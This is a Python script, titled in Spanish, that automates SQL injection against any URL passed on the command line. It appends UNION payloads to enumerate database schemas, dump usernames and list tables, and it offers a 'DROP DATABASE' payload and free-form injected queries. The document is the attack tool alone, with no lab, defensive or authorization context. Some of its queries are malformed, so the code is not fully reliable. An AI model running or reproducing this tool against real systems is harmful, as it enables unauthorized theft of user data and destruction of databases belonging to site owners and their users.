

# script para automatizar sqli



```python
import requests
import logging
from argparse import ArgumentParser
from getpass import getpass

# Configuración de logging
logging.basicConfig(filename='sql_injection.log', level=logging.INFO)

def fetch_databases(url, payload):
    try:
        response = requests.get(f"{url}{payload}")
        if response.status_code == 200:
            logging.info("Bases de datos obtenidas correctamente.")
            return response.text.split()
        else:
            logging.error(f"Error HTTP: {response.status_code}")
            return []
    except requests.exceptions.RequestException as e:
        logging.error(f"Error de conexión: {e}")
        return []

def user_input(prompt, valid_options=None):
    while True:
        choice = input(prompt)
        if not valid_options or (choice.isdigit() and int(choice) in valid_options):
            return int(choice) if choice.isdigit() else choice
        else:
            print("Entrada inválida. Intenta de nuevo.")

def select_database(databases):
    for i, db in enumerate(databases):
        print(f"{i + 1}. {db}")
    choice = user_input("Selecciona el número de la base de datos: ", range(1, len(databases) + 1))
    return databases[choice - 1]

def execute_payload(url, database, choice):
    if choice == 1:
        payload = f" UNION SELECT username FROM {database}.users --"
    elif choice == 2:
        payload = f" UNION SELECT table_name FROM {database}.information_schema.tables --"
    elif choice == 3:
        payload = f"; DROP DATABASE {database} --"
    elif choice == 4:
        custom_query = user_input("Escribe tu consulta SQL: ")
        payload = f" {custom_query} --"
    try:
        response = requests.get(f"{url}{payload}")
        if response.status_code == 200:
            print("Resultado del Payload:")
            print(response.text)
        else:
            print("Error en la solicitud HTTP:", response.status_code)
    except requests.exceptions.RequestException as e:
        print(f"Error de conexión: {e}")

def main():
    parser = ArgumentParser(description="SQL Injection Tester")
    parser.add_argument("url", help="Base URL for the SQL injection")
    args = parser.parse_args()

    base_url = args.url
    payload = " UNION SELECT schema_name FROM information_schema.schemata -- -"

    databases = fetch_databases(base_url, payload)
    if databases:
        selected_db = select_database(databases)
        print("1. Listar todos los usuarios")
        print("2. Listar tablas")
        print("3. Borrar base de datos")
        print("4. Escribir consulta personalizada")
        choice = user_input("Elige una opción de payload: ", range(1, 5))
        execute_payload(base_url, selected_db, choice)
    else:
        print("No se encontraron bases de datos.")

if __name__ == "__main__":
    main()

```